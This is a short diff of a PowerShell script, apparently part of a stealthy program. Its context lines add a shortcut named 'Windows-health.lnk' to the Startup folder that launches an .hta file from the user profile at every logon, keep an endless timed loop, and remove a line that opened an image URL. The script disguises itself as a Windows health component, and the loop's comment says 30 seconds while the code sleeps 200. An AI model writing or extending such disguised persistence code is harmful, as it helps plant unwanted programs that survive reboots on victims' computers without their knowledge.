@@ -3,8 +3,7 @@
 $Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows-health.lnk")
 $Shortcut.TargetPath = "$env:USERPROFILE\Windows-health.hta"
 $Shortcut.Save()
-$url = "https://i.ytimg.com/vi/qgWDJewuidY/maxresdefault.jpg"
-Start-Process $url
+
 # Loop to run PowerShell script every 30 seconds
 while ($true) {
     Start-Sleep -Seconds 200
